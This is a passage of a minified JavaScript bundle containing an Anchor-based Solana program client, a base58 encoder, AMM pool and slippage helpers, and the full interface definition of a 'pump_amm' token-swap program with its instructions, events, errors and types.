              t.errors.forEach((t) => {
                var n;
                let r = null !== (n = t.msg) && void 0 !== n ? n : t.name;
                e.set(t.code, r);
              }),
            e
          );
        })(t),
        f = t.accounts ? Bm.build(t, e, n, r) : {};
      return (
        t.instructions.forEach((h) => {
          const p = Sm.build(h, (t, n) => e.instruction.encode(t, n), n),
            m = _m.build(h, p),
            g = Tm.build(h, m, d, r),
            y = xm.build(h, m, d, r, e, n, t),
            w = jm.build(n, h, y, t),
            b = zm.build(
              r,
              n,
              h,
              p,
              m,
              g,
              y,
              w,
              f,
              t.types || [],
              null == o ? void 0 : o(h)
            ),
            v = h.name;
          (s[v] = p),
            (a[v] = m),
            (i[v] = g),
            (u[v] = y),
            (c[v] = b),
            w && (l[v] = w);
        }),
        [i, s, a, f, u, c, l]
      );
    }
  }
  class Vm {
    get programId() {
      return this._programId;
    }
    get idl() {
      return this._idl;
    }
    get rawIdl() {
      return this._rawIdl;
    }
    get coder() {
      return this._coder;
    }
    get provider() {
      return this._provider;
    }
    constructor(t, e = Qf(), n, r) {
      (this._idl = (function (t) {
        const e = ["name", "path", "account", "relations", "generic"],
          n = (t) => t.split(".").map(Nl).join("."),
          r = (t) => {
            for (const o in t) {
              const i = t[o];
              e.includes(o)
                ? (t[o] = Array.isArray(i) ? i.map(n) : n(i))
                : "object" == typeof i && r(i);
            }
          },
          o = structuredClone(t);
        return r(o), o;
      })(t)),
        (this._rawIdl = t),
        (this._provider = e),
        (this._programId = vf(t.address)),
        (this._coder = null != n ? n : new qp(this._idl)),
        (this._events = new bm(this._programId, e, this._coder));
      const [o, i, s, a, u, c, l] = Gm.build(
        this._idl,
        this._coder,
        this._programId,
        e,
        r
      );
      (this.rpc = o),
        (this.instruction = i),
        (this.transaction = s),
        (this.account = a),
        (this.simulate = u),
        (this.methods = c),
        (this.views = l);
    }
    static async at(t, e) {
      const n = vf(t),
        r = await Vm.fetchIdl(n, e);
      if (!r) throw new Error(`IDL not found for program: ${t.toString()}`);
      return new Vm(r, e);
    }
    static async fetchIdl(t, e) {
      e = null != e ? e : Qf();
      const n = vf(t),
        r = await (async function (t) {
          const e = (await Ji.findProgramAddress([], t))[0];
          return await Ji.createWithSeed(e, "anchor:idl", t);
        })(n),
        o = await e.connection.getAccountInfo(r);
      if (!o) return null;
      let i = ((s = o.data.slice(8)), gf.decode(s));
      var s;
      const a = uf(i.data);
      return JSON.parse(((u = a), new TextDecoder("utf-8").decode(u)));
      var u;
    }
    addEventListener(t, e, n) {
      return this._events.addEventListener(t, e, n);
    }
    async removeEventListener(t) {
      return await this._events.removeEventListener(t);
    }
  }
  new Ji("11111111111111111111111111111111"),
    (window.skCrypt = function (t) {
      return function () {
        return t;
      };
    }),
    (window.skCrypt = function (t) {
      return function () {
        return t;
      };
    });
  const Hm = (function (t) {
    if (t.length >= 255) throw new TypeError("Alphabet too long");
    const e = new Uint8Array(256);
    for (let a = 0; a < e.length; a++) e[a] = 255;
    for (let a = 0; a < t.length; a++) {
      const n = t.charAt(a),
        r = n.charCodeAt(0);
      if (255 !== e[r]) throw new TypeError(n + " is ambiguous");
      e[r] = a;
    }
    const n = t.length,
      r = t.charAt(0),
      o = Math.log(n) / Math.log(256),
      i = Math.log(256) / Math.log(n);
    function s(t) {
      if ("string" != typeof t) throw new TypeError("Expected String");
      if (0 === t.length) return new Uint8Array();
      let i = 0,
        s = 0,
        a = 0;
      for (; t[i] === r; ) s++, i++;
      const u = ((t.length - i) * o + 1) >>> 0,
        c = new Uint8Array(u);
      for (; i < t.length; ) {
        const r = t.charCodeAt(i);
        if (r > 255) return;
        let o = e[r];
        if (255 === o) return;
        let s = 0;
        for (let t = u - 1; (0 !== o || s < a) && -1 !== t; t--, s++)
          (o += (n * c[t]) >>> 0),
            (c[t] = o % 256 >>> 0),
            (o = (o / 256) >>> 0);
        if (0 !== o) throw new Error("Non-zero carry");
        (a = s), i++;
      }
      let l = u - a;
      for (; l !== u && 0 === c[l]; ) l++;
      const d = new Uint8Array(s + (u - l));
      let f = s;
      for (; l !== u; ) d[f++] = c[l++];
      return d;
    }
    return {
      encode: function (e) {
        if (
          (e instanceof Uint8Array ||
            (ArrayBuffer.isView(e)
              ? (e = new Uint8Array(e.buffer, e.byteOffset, e.byteLength))
              : Array.isArray(e) && (e = Uint8Array.from(e))),
          !(e instanceof Uint8Array))
        )
          throw new TypeError("Expected Uint8Array");
        if (0 === e.length) return "";
        let o = 0,
          s = 0,
          a = 0;
        const u = e.length;
        for (; a !== u && 0 === e[a]; ) a++, o++;
        const c = ((u - a) * i + 1) >>> 0,
          l = new Uint8Array(c);
        for (; a !== u; ) {
          let t = e[a],
            r = 0;
          for (let e = c - 1; (0 !== t || r < s) && -1 !== e; e--, r++)
            (t += (256 * l[e]) >>> 0),
              (l[e] = t % n >>> 0),
              (t = (t / n) >>> 0);
          if (0 !== t) throw new Error("Non-zero carry");
          (s = r), a++;
        }
        let d = c - s;
        for (; d !== c && 0 === l[d]; ) d++;
        let f = r.repeat(o);
        for (; d < c; ++d) f += t.charAt(l[d]);
        return f;
      },
      decodeUnsafe: s,
      decode: function (t) {
        const e = s(t);
        if (e) return e;
        throw new Error("Non-base" + n + " character");
      },
    };
  })("123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz");
  window.skCrypt = function (t) {
    return function () {
      return t;
    };
  };
  var Zm = "pAMMBay6oceH9fJKBRHGP5D4bD4sWpmSwMn52FMfXEA",
    Xm = new Ji(Zm);
  function Jm(t, e, n, r, o = Xm) {
    return Ji.findProgramAddressSync(
      [
        dt.from("pool"),
        new Yn(t).toArrayLike(dt, "le", 2),
        e.toBuffer(),
        n.toBuffer(),
        r.toBuffer(),
      ],
      o
    );
  }
  function Ym(t = Xm) {
    return Ji.findProgramAddressSync([dt.from("__event_authority")], t);
  }
  function Qm(t, e, n, r, o) {
    if (e < 0 || e > 100)
      throw new Error("Slippage must be between 0 and 100 (0% to 100%)");
    const i = t.mul(r).div(n),
      s = new Yn(1e9 * (1 + e / 100)),
      a = t.mul(s).div(new Yn(1e9)),
      u = i.mul(s).div(new Yn(1e9));
    return { token1: i, lpToken: t.mul(o).div(n), maxToken0: a, maxToken1: u };
  }
  function $m(t, e) {
    return t.add(e).sub(new Yn(1)).div(e);
  }
  new Ji("6EF8rrecthR5Dkzon8Nwu78hRvfCKubJ14M5uBEwF6P");
  var tg = {
    address: "pAMMBay6oceH9fJKBRHGP5D4bD4sWpmSwMn52FMfXEA",
    metadata: {
      name: "pump_amm",
      version: "0.1.0",
      spec: "0.1.0",
      description: "Created with Anchor",
    },
    instructions: [
      {
        name: "buy",
        discriminator: [102, 6, 61, 18, 1, 218, 235, 234],
        accounts: [
          { name: "pool" },
          { name: "user", writable: !0, signer: !0 },
          { name: "global_config" },
          { name: "base_mint", relations: ["pool"] },
          { name: "quote_mint", relations: ["pool"] },
          { name: "user_base_token_account", writable: !0 },
          { name: "user_quote_token_account", writable: !0 },
          {
            name: "pool_base_token_account",
            writable: !0,
            relations: ["pool"],
          },
          {
            name: "pool_quote_token_account",
            writable: !0,
            relations: ["pool"],
          },
          { name: "protocol_fee_recipient" },
          {
            name: "protocol_fee_recipient_token_account",
            writable: !0,
            pda: {
              seeds: [
                { kind: "account", path: "protocol_fee_recipient" },
                { kind: "account", path: "quote_token_program" },
                { kind: "account", path: "quote_mint" },
              ],
              program: {
                kind: "const",
                value: [
                  140, 151, 37, 143, 78, 36, 137, 241, 187, 61, 16, 41, 20, 142,
                  13, 131, 11, 90, 19, 153, 218, 255, 16, 132, 4, 142, 123, 216,
                  219, 233, 248, 89,
                ],
              },
            },
          },
          { name: "base_token_program" },
          { name: "quote_token_program" },
          {
            name: "system_program",
            address: "11111111111111111111111111111111",
          },
          {
            name: "associated_token_program",
            address: "ATokenGPvbdGVxr1b2hvZbsiqW5xWH25efTNsLJA8knL",
          },
          {
            name: "event_authority",
            pda: {
              seeds: [
                {
                  kind: "const",
                  value: [
                    95, 95, 101, 118, 101, 110, 116, 95, 97, 117, 116, 104, 111,
                    114, 105, 116, 121,
                  ],
                },
              ],
            },
          },
          { name: "program" },
          {
            name: "coin_creator_vault_ata",
            writable: !0,
            pda: {
              seeds: [
                { kind: "account", path: "coin_creator_vault_authority" },
                { kind: "account", path: "quote_token_program" },
                { kind: "account", path: "quote_mint" },
              ],
              program: {
                kind: "const",
                value: [
                  140, 151, 37, 143, 78, 36, 137, 241, 187, 61, 16, 41, 20, 142,
                  13, 131, 11, 90, 19, 153, 218, 255, 16, 132, 4, 142, 123, 216,
                  219, 233, 248, 89,
                ],
              },
            },
          },
          {
            name: "coin_creator_vault_authority",
            pda: {
              seeds: [
                {
                  kind: "const",
                  value: [
                    99, 114, 101, 97, 116, 111, 114, 95, 118, 97, 117, 108, 116,
                  ],
                },
                { kind: "account", path: "pool.coin_creator", account: "Pool" },
              ],
            },
          },
        ],
        args: [
          { name: "base_amount_out", type: "u64" },
          { name: "max_quote_amount_in", type: "u64" },
        ],
      },
      {
        name: "collect_coin_creator_fee",
        discriminator: [160, 57, 89, 42, 181, 139, 43, 66],
        accounts: [
          { name: "quote_mint" },
          { name: "quote_token_program" },
          { name: "coin_creator", signer: !0 },
          {
            name: "coin_creator_vault_authority",
            pda: {
              seeds: [
                {
                  kind: "const",
                  value: [
                    99, 114, 101, 97, 116, 111, 114, 95, 118, 97, 117, 108, 116,
                  ],
                },
                { kind: "account", path: "coin_creator" },
              ],
            },
          },
          {
            name: "coin_creator_vault_ata",
            writable: !0,
            pda: {
              seeds: [
                { kind: "account", path: "coin_creator_vault_authority" },
                { kind: "account", path: "quote_token_program" },
                { kind: "account", path: "quote_mint" },
              ],
              program: {
                kind: "const",
                value: [
                  140, 151, 37, 143, 78, 36, 137, 241, 187, 61, 16, 41, 20, 142,
                  13, 131, 11, 90, 19, 153, 218, 255, 16, 132, 4, 142, 123, 216,
                  219, 233, 248, 89,
                ],
              },
            },
          },
          { name: "coin_creator_token_account", writable: !0 },
          {
            name: "event_authority",
            pda: {
              seeds: [
                {
                  kind: "const",
                  value: [
                    95, 95, 101, 118, 101, 110, 116, 95, 97, 117, 116, 104, 111,
                    114, 105, 116, 121,
                  ],
                },
              ],
            },
          },
          { name: "program" },
        ],
        args: [],
      },
      {
        name: "create_config",
        discriminator: [201, 207, 243, 114, 75, 111, 47, 189],
        accounts: [
          {
            name: "admin",
            writable: !0,
            signer: !0,
            address: "8LWu7QM2dGR1G8nKDHthckea57bkCzXyBTAKPJUBDHo8",
          },
          {
            name: "global_config",
            writable: !0,
            pda: {
              seeds: [
                {
                  kind: "const",
                  value: [
                    103, 108, 111, 98, 97, 108, 95, 99, 111, 110, 102, 105, 103,
                  ],
                },
              ],
            },
          },
          {
            name: "system_program",
            address: "11111111111111111111111111111111",
          },
          {
            name: "event_authority",
            pda: {
              seeds: [
                {
                  kind: "const",
                  value: [
                    95, 95, 101, 118, 101, 110, 116, 95, 97, 117, 116, 104, 111,
                    114, 105, 116, 121,
                  ],
                },
              ],
            },
          },
          { name: "program" },
        ],
        args: [
          { name: "lp_fee_basis_points", type: "u64" },
          { name: "protocol_fee_basis_points", type: "u64" },
          { name: "protocol_fee_recipients", type: { array: ["pubkey", 8] } },
          { name: "coin_creator_fee_basis_points", type: "u64" },
        ],
      },
      {
        name: "create_pool",
        discriminator: [233, 146, 209, 142, 207, 104, 64, 188],
        accounts: [
          {
            name: "pool",
            writable: !0,
            pda: {
              seeds: [
                { kind: "const", value: [112, 111, 111, 108] },
                { kind: "arg", path: "index" },
                { kind: "account", path: "creator" },
                { kind: "account", path: "base_mint" },
                { kind: "account", path: "quote_mint" },
              ],
            },
          },
          { name: "global_config" },
          { name: "creator", writable: !0, signer: !0 },
          { name: "base_mint" },
          { name: "quote_mint" },
          {
            name: "lp_mint",
            writable: !0,
            pda: {
              seeds: [
                {
                  kind: "const",
                  value: [
                    112, 111, 111, 108, 95, 108, 112, 95, 109, 105, 110, 116,
                  ],
                },
                { kind: "account", path: "pool" },
              ],
            },
          },
          { name: "user_base_token_account", writable: !0 },
          { name: "user_quote_token_account", writable: !0 },
          {
            name: "user_pool_token_account",
            writable: !0,
            pda: {
              seeds: [
                { kind: "account", path: "creator" },
                { kind: "account", path: "token_2022_program" },
                { kind: "account", path: "lp_mint" },
              ],
              program: {
                kind: "const",
                value: [
                  140, 151, 37, 143, 78, 36, 137, 241, 187, 61, 16, 41, 20, 142,
                  13, 131, 11, 90, 19, 153, 218, 255, 16, 132, 4, 142, 123, 216,
                  219, 233, 248, 89,
                ],
              },
            },
          },
          {
            name: "pool_base_token_account",
            writable: !0,
            pda: {
              seeds: [
                { kind: "account", path: "pool" },
                { kind: "account", path: "base_token_program" },
                { kind: "account", path: "base_mint" },
              ],
              program: {
                kind: "const",
                value: [
                  140, 151, 37, 143, 78, 36, 137, 241, 187, 61, 16, 41, 20, 142,
                  13, 131, 11, 90, 19, 153, 218, 255, 16, 132, 4, 142, 123, 216,
                  219, 233, 248, 89,
                ],
              },
            },
          },
          {
            name: "pool_quote_token_account",
            writable: !0,
            pda: {
              seeds: [
                { kind: "account", path: "pool" },
                { kind: "account", path: "quote_token_program" },
                { kind: "account", path: "quote_mint" },
              ],
              program: {
                kind: "const",
                value: [
                  140, 151, 37, 143, 78, 36, 137, 241, 187, 61, 16, 41, 20, 142,
                  13, 131, 11, 90, 19, 153, 218, 255, 16, 132, 4, 142, 123, 216,
                  219, 233, 248, 89,
                ],
              },
            },
          },
          {
            name: "system_program",
            address: "11111111111111111111111111111111",
          },
          {
            name: "token_2022_program",
            address: "TokenzQdBNbLqP5VEhdkAS6EPFLC1PHnBqCXEpPxuEb",
          },
          { name: "base_token_program" },
          { name: "quote_token_program" },
          {
            name: "associated_token_program",
            address: "ATokenGPvbdGVxr1b2hvZbsiqW5xWH25efTNsLJA8knL",
          },
          {
            name: "event_authority",
            pda: {
              seeds: [
                {
                  kind: "const",
                  value: [
                    95, 95, 101, 118, 101, 110, 116, 95, 97, 117, 116, 104, 111,
                    114, 105, 116, 121,
                  ],
                },
              ],
            },
          },
          { name: "program" },
        ],
        args: [
          { name: "index", type: "u16" },
          { name: "base_amount_in", type: "u64" },
          { name: "quote_amount_in", type: "u64" },
          { name: "coin_creator", type: "pubkey" },
        ],
      },
      {
        name: "deposit",
        discriminator: [242, 35, 198, 137, 82, 225, 242, 182],
        accounts: [
          { name: "pool", writable: !0 },
          { name: "global_config" },
          { name: "user", signer: !0 },
          { name: "base_mint", relations: ["pool"] },
          { name: "quote_mint", relations: ["pool"] },
          { name: "lp_mint", writable: !0, relations: ["pool"] },
          { name: "user_base_token_account", writable: !0 },
          { name: "user_quote_token_account", writable: !0 },
          { name: "user_pool_token_account", writable: !0 },
          {
            name: "pool_base_token_account",
            writable: !0,
            relations: ["pool"],
          },
          {
            name: "pool_quote_token_account",
            writable: !0,
            relations: ["pool"],
          },
          {
            name: "token_program",
            address: "TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA",
          },
          {
            name: "token_2022_program",
            address: "TokenzQdBNbLqP5VEhdkAS6EPFLC1PHnBqCXEpPxuEb",
          },
          {
            name: "event_authority",
            pda: {
              seeds: [
                {
                  kind: "const",
                  value: [
                    95, 95, 101, 118, 101, 110, 116, 95, 97, 117, 116, 104, 111,
                    114, 105, 116, 121,
                  ],
                },
              ],
            },
          },
          { name: "program" },
        ],
        args: [
          { name: "lp_token_amount_out", type: "u64" },
          { name: "max_base_amount_in", type: "u64" },
          { name: "max_quote_amount_in", type: "u64" },
        ],
      },
      {
        name: "disable",
        discriminator: [185, 173, 187, 90, 216, 15, 238, 233],
        accounts: [
          { name: "admin", signer: !0, relations: ["global_config"] },
          { name: "global_config", writable: !0 },
          {
            name: "event_authority",
            pda: {
              seeds: [
                {
                  kind: "const",
                  value: [
                    95, 95, 101, 118, 101, 110, 116, 95, 97, 117, 116, 104, 111,
                    114, 105, 116, 121,
                  ],
                },
              ],
            },
          },
          { name: "program" },
        ],
        args: [
          { name: "disable_create_pool", type: "bool" },
          { name: "disable_deposit", type: "bool" },
          { name: "disable_withdraw", type: "bool" },
          { name: "disable_buy", type: "bool" },
          { name: "disable_sell", type: "bool" },
        ],
      },
      {
        name: "extend_account",
        discriminator: [234, 102, 194, 203, 150, 72, 62, 229],
        accounts: [
          { name: "account", writable: !0 },
          { name: "user", signer: !0 },
          {
            name: "system_program",
            address: "11111111111111111111111111111111",
          },
          {
            name: "event_authority",
            pda: {
              seeds: [
                {
                  kind: "const",
                  value: [
                    95, 95, 101, 118, 101, 110, 116, 95, 97, 117, 116, 104, 111,
                    114, 105, 116, 121,
                  ],
                },
              ],
            },
          },
          { name: "program" },
        ],
        args: [],
      },
      {
        name: "sell",
        discriminator: [51, 230, 133, 164, 1, 127, 131, 173],
        accounts: [
          { name: "pool" },
          { name: "user", writable: !0, signer: !0 },
          { name: "global_config" },
          { name: "base_mint", relations: ["pool"] },
          { name: "quote_mint", relations: ["pool"] },
          { name: "user_base_token_account", writable: !0 },
          { name: "user_quote_token_account", writable: !0 },
          {
            name: "pool_base_token_account",
            writable: !0,
            relations: ["pool"],
          },
          {
            name: "pool_quote_token_account",
            writable: !0,
            relations: ["pool"],
          },
          { name: "protocol_fee_recipient" },
          {
            name: "protocol_fee_recipient_token_account",
            writable: !0,
            pda: {
              seeds: [
                { kind: "account", path: "protocol_fee_recipient" },
                { kind: "account", path: "quote_token_program" },
                { kind: "account", path: "quote_mint" },
              ],
              program: {
                kind: "const",
                value: [
                  140, 151, 37, 143, 78, 36, 137, 241, 187, 61, 16, 41, 20, 142,
                  13, 131, 11, 90, 19, 153, 218, 255, 16, 132, 4, 142, 123, 216,
                  219, 233, 248, 89,
                ],
              },
            },
          },
          { name: "base_token_program" },
          { name: "quote_token_program" },
          {
            name: "system_program",
            address: "11111111111111111111111111111111",
          },
          {
            name: "associated_token_program",
            address: "ATokenGPvbdGVxr1b2hvZbsiqW5xWH25efTNsLJA8knL",
          },
          {
            name: "event_authority",
            pda: {
              seeds: [
                {
                  kind: "const",
                  value: [
                    95, 95, 101, 118, 101, 110, 116, 95, 97, 117, 116, 104, 111,
                    114, 105, 116, 121,
                  ],
                },
              ],
            },
          },
          { name: "program" },
          {
            name: "coin_creator_vault_ata",
            writable: !0,
            pda: {
              seeds: [
                { kind: "account", path: "coin_creator_vault_authority" },
                { kind: "account", path: "quote_token_program" },
                { kind: "account", path: "quote_mint" },
              ],
              program: {
                kind: "const",
                value: [
                  140, 151, 37, 143, 78, 36, 137, 241, 187, 61, 16, 41, 20, 142,
                  13, 131, 11, 90, 19, 153, 218, 255, 16, 132, 4, 142, 123, 216,
                  219, 233, 248, 89,
                ],
              },
            },
          },
          {
            name: "coin_creator_vault_authority",
            pda: {
              seeds: [
                {
                  kind: "const",
                  value: [
                    99, 114, 101, 97, 116, 111, 114, 95, 118, 97, 117, 108, 116,
                  ],
                },
                { kind: "account", path: "pool.coin_creator", account: "Pool" },
              ],
            },
          },
        ],
        args: [
          { name: "base_amount_in", type: "u64" },
          { name: "min_quote_amount_out", type: "u64" },
        ],
      },
      {
        name: "set_coin_creator",
        docs: [
          "Sets Pool::coin_creator from Metaplex metadata creator or BondingCurve::creator",
        ],
        discriminator: [210, 149, 128, 45, 188, 58, 78, 175],
        accounts: [
          { name: "pool", writable: !0 },
          {
            name: "metadata",
            pda: {
              seeds: [
                { kind: "const", value: [109, 101, 116, 97, 100, 97, 116, 97] },
                {
                  kind: "const",
                  value: [
                    11, 112, 101, 177, 227, 209, 124, 69, 56, 157, 82, 127, 107,
                    4, 195, 205, 88, 184, 108, 115, 26, 160, 253, 181, 73, 182,
                    209, 188, 3, 248, 41, 70,
                  ],
                },
                { kind: "account", path: "pool.base_mint", account: "Pool" },
              ],
              program: {
                kind: "const",
                value: [
                  11, 112, 101, 177, 227, 209, 124, 69, 56, 157, 82, 127, 107,
                  4, 195, 205, 88, 184, 108, 115, 26, 160, 253, 181, 73, 182,
                  209, 188, 3, 248, 41, 70,
                ],
              },
            },
          },
          {
            name: "bonding_curve",
            pda: {
              seeds: [
                {
                  kind: "const",
                  value: [
                    98, 111, 110, 100, 105, 110, 103, 45, 99, 117, 114, 118,
                    101,
                  ],
                },
                { kind: "account", path: "pool.base_mint", account: "Pool" },
              ],
              program: {
                kind: "const",
                value: [
                  1, 86, 224, 246, 147, 102, 90, 207, 68, 219, 21, 104, 191, 23,
                  91, 170, 81, 137, 203, 151, 245, 210, 255, 59, 101, 93, 43,
                  182, 253, 109, 24, 176,
                ],
              },
            },
          },
          {
            name: "event_authority",
            pda: {
              seeds: [
                {
                  kind: "const",
                  value: [
                    95, 95, 101, 118, 101, 110, 116, 95, 97, 117, 116, 104, 111,
                    114, 105, 116, 121,
                  ],
                },
              ],
            },
          },
          { name: "program" },
        ],
        args: [],
      },
      {
        name: "update_admin",
        discriminator: [161, 176, 40, 213, 60, 184, 179, 228],
        accounts: [
          { name: "admin", signer: !0, relations: ["global_config"] },
          { name: "global_config", writable: !0 },
          { name: "new_admin" },
          {
            name: "event_authority",
            pda: {
              seeds: [
                {
                  kind: "const",
                  value: [
                    95, 95, 101, 118, 101, 110, 116, 95, 97, 117, 116, 104, 111,
                    114, 105, 116, 121,
                  ],
                },
              ],
            },
          },
          { name: "program" },
        ],
        args: [],
      },
      {
        name: "update_fee_config",
        discriminator: [104, 184, 103, 242, 88, 151, 107, 20],
        accounts: [
          { name: "admin", signer: !0, relations: ["global_config"] },
          { name: "global_config", writable: !0 },
          {
            name: "event_authority",
            pda: {
              seeds: [
                {
                  kind: "const",
                  value: [
                    95, 95, 101, 118, 101, 110, 116, 95, 97, 117, 116, 104, 111,
                    114, 105, 116, 121,
                  ],
                },
              ],
            },
          },
          { name: "program" },
        ],
        args: [
          { name: "lp_fee_basis_points", type: "u64" },
          { name: "protocol_fee_basis_points", type: "u64" },
          { name: "protocol_fee_recipients", type: { array: ["pubkey", 8] } },
          { name: "coin_creator_fee_basis_points", type: "u64" },
        ],
      },
      {
        name: "withdraw",
        discriminator: [183, 18, 70, 156, 148, 109, 161, 34],
        accounts: [
          { name: "pool", writable: !0 },
          { name: "global_config" },
          { name: "user", signer: !0 },
          { name: "base_mint", relations: ["pool"] },
          { name: "quote_mint", relations: ["pool"] },
          { name: "lp_mint", writable: !0, relations: ["pool"] },
          { name: "user_base_token_account", writable: !0 },
          { name: "user_quote_token_account", writable: !0 },
          { name: "user_pool_token_account", writable: !0 },
          {
            name: "pool_base_token_account",
            writable: !0,
            relations: ["pool"],
          },
          {
            name: "pool_quote_token_account",
            writable: !0,
            relations: ["pool"],
          },
          {
            name: "token_program",
            address: "TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA",
          },
          {
            name: "token_2022_program",
            address: "TokenzQdBNbLqP5VEhdkAS6EPFLC1PHnBqCXEpPxuEb",
          },
          {
            name: "event_authority",
            pda: {
              seeds: [
                {
                  kind: "const",
                  value: [
                    95, 95, 101, 118, 101, 110, 116, 95, 97, 117, 116, 104, 111,
                    114, 105, 116, 121,
                  ],
                },
              ],
            },
          },
          { name: "program" },
        ],
        args: [
          { name: "lp_token_amount_in", type: "u64" },
          { name: "min_base_amount_out", type: "u64" },
          { name: "min_quote_amount_out", type: "u64" },
        ],
      },
    ],
    accounts: [
      {
        name: "BondingCurve",
        discriminator: [23, 183, 248, 55, 96, 216, 172, 96],
      },
      {
        name: "GlobalConfig",
        discriminator: [149, 8, 156, 202, 160, 252, 176, 217],
      },
      { name: "Pool", discriminator: [241, 154, 109, 4, 17, 177, 109, 188] },
    ],
    events: [
      {
        name: "BuyEvent",
        discriminator: [103, 244, 82, 31, 44, 245, 119, 119],
      },
      {
        name: "CollectCoinCreatorFeeEvent",
        discriminator: [232, 245, 194, 238, 234, 218, 58, 89],
      },
      {
        name: "CreateConfigEvent",
        discriminator: [107, 52, 89, 129, 55, 226, 81, 22],
      },
      {
        name: "CreatePoolEvent",
        discriminator: [177, 49, 12, 210, 160, 118, 167, 116],
      },
      {
        name: "DepositEvent",
        discriminator: [120, 248, 61, 83, 31, 142, 107, 144],
      },
      {
        name: "DisableEvent",
        discriminator: [107, 253, 193, 76, 228, 202, 27, 104],
      },
      {
        name: "ExtendAccountEvent",
        discriminator: [97, 97, 215, 144, 93, 146, 22, 124],
      },
      { name: "SellEvent", discriminator: [62, 47, 55, 10, 165, 3, 220, 42] },
      {
        name: "SetBondingCurveCoinCreatorEvent",
        discriminator: [242, 231, 235, 102, 65, 99, 189, 211],
      },
      {
        name: "SetMetaplexCoinCreatorEvent",
        discriminator: [150, 107, 199, 123, 124, 207, 102, 228],
      },
      {
        name: "UpdateAdminEvent",
        discriminator: [225, 152, 171, 87, 246, 63, 66, 234],
      },
      {
        name: "UpdateFeeConfigEvent",
        discriminator: [90, 23, 65, 35, 62, 244, 188, 208],
      },
      {
        name: "WithdrawEvent",
        discriminator: [22, 9, 133, 26, 160, 44, 71, 192],
      },
    ],
    errors: [
      { code: 6e3, name: "FeeBasisPointsExceedsMaximum" },
      { code: 6001, name: "ZeroBaseAmount" },
      { code: 6002, name: "ZeroQuoteAmount" },
      { code: 6003, name: "TooLittlePoolTokenLiquidity" },
      { code: 6004, name: "ExceededSlippage" },
      { code: 6005, name: "InvalidAdmin" },
      { code: 6006, name: "UnsupportedBaseMint" },
      { code: 6007, name: "UnsupportedQuoteMint" },
      { code: 6008, name: "InvalidBaseMint" },
      { code: 6009, name: "InvalidQuoteMint" },
      { code: 6010, name: "InvalidLpMint" },
      { code: 6011, name: "AllProtocolFeeRecipientsShouldBeNonZero" },
      { code: 6012, name: "UnsortedNotUniqueProtocolFeeRecipients" },
      { code: 6013, name: "InvalidProtocolFeeRecipient" },
      { code: 6014, name: "InvalidPoolBaseTokenAccount" },
      { code: 6015, name: "InvalidPoolQuoteTokenAccount" },
      { code: 6016, name: "BuyMoreBaseAmountThanPoolReserves" },
      { code: 6017, name: "DisabledCreatePool" },
      { code: 6018, name: "DisabledDeposit" },
      { code: 6019, name: "DisabledWithdraw" },
      { code: 6020, name: "DisabledBuy" },
      { code: 6021, name: "DisabledSell" },
      { code: 6022, name: "SameMint" },
      { code: 6023, name: "Overflow" },
      { code: 6024, name: "Truncation" },
      { code: 6025, name: "DivisionByZero" },
      { code: 6026, name: "NewSizeLessThanCurrentSize" },
      { code: 6027, name: "AccountTypeNotSupported" },
      { code: 6028, name: "OnlyCanonicalPumpPoolsCanHaveCoinCreator" },
    ],
    types: [
      {
        name: "BondingCurve",
        type: {
          kind: "struct",
          fields: [
            { name: "virtual_token_reserves", type: "u64" },
            { name: "virtual_sol_reserves", type: "u64" },
            { name: "real_token_reserves", type: "u64" },
            { name: "real_sol_reserves", type: "u64" },
            { name: "token_total_supply", type: "u64" },
            { name: "complete", type: "bool" },
            { name: "creator", type: "pubkey" },
          ],
        },
      },
      {
        name: "BuyEvent",
        type: {
          kind: "struct",
          fields: [
            { name: "timestamp", type: "i64" },
            { name: "base_amount_out", type: "u64" },
            { name: "max_quote_amount_in", type: "u64" },
            { name: "user_base_token_reserves", type: "u64" },
            { name: "user_quote_token_reserves", type: "u64" },
            { name: "pool_base_token_reserves", type: "u64" },
            { name: "pool_quote_token_reserves", type: "u64" },
            { name: "quote_amount_in", type: "u64" },
            { name: "lp_fee_basis_points", type: "u64" },
            { name: "lp_fee", type: "u64" },
            { name: "protocol_fee_basis_points", type: "u64" },
            { name: "protocol_fee", type: "u64" },
            { name: "quote_amount_in_with_lp_fee", type: "u64" },
            { name: "user_quote_amount_in", type: "u64" },
            { name: "pool", type: "pubkey" },
            { name: "user", type: "pubkey" },
            { name: "user_base_token_account", type: "pubkey" },
            { name: "user_quote_token_account", type: "pubkey" },
            { name: "protocol_fee_recipient", type: "pubkey" },
            { name: "protocol_fee_recipient_token_account", type: "pubkey" },
            { name: "coin_creator", type: "pubkey" },
            { name: "coin_creator_fee_basis_points", type: "u64" },
            { name: "coin_creator_fee", type: "u64" },
          ],
        },
      },
      {
        name: "CollectCoinCreatorFeeEvent",
        type: {
          kind: "struct",
          fields: [
            { name: "timestamp", type: "i64" },
            { name: "coin_creator", type: "pubkey" },
            { name: "coin_creator_fee", type: "u64" },
            { name: "coin_creator_vault_ata", type: "pubkey" },
            { name: "coin_creator_token_account", type: "pubkey" },
          ],
        },
      },
      {
        name: "CreateConfigEvent",
        type: {
          kind: "struct",
          fields: [
            { name: "timestamp", type: "i64" },
            { name: "admin", type: "pubkey" },
            { name: "lp_fee_basis_points", type: "u64" },
            { name: "protocol_fee_basis_points", type: "u64" },
            { name: "protocol_fee_recipients", type: { array: ["pubkey", 8] } },
            { name: "coin_creator_fee_basis_points", type: "u64" },
          ],
        },
      },
      {
        name: "CreatePoolEvent",
        type: {
          kind: "struct",
          fields: [
            { name: "timestamp", type: "i64" },
            { name: "index", type: "u16" },
            { name: "creator", type: "pubkey" },
            { name: "base_mint", type: "pubkey" },
            { name: "quote_mint", type: "pubkey" },
            { name: "base_mint_decimals", type: "u8" },
            { name: "quote_mint_decimals", type: "u8" },
            { name: "base_amount_in", type: "u64" },
            { name: "quote_amount_in", type: "u64" },
            { name: "pool_base_amount", type: "u64" },
            { name: "pool_quote_amount", type: "u64" },
            { name: "minimum_liquidity", type: "u64" },
            { name: "initial_liquidity", type: "u64" },
            { name: "lp_token_amount_out", type: "u64" },
            { name: "pool_bump", type: "u8" },
            { name: "pool", type: "pubkey" },
            { name: "lp_mint", type: "pubkey" },
            { name: "user_base_token_account", type: "pubkey" },
            { name: "user_quote_token_account", type: "pubkey" },
            { name: "coin_creator", type: "pubkey" },
          ],
        },
      },
      {
        name: "DepositEvent",
        type: {
          kind: "struct",
          fields: [
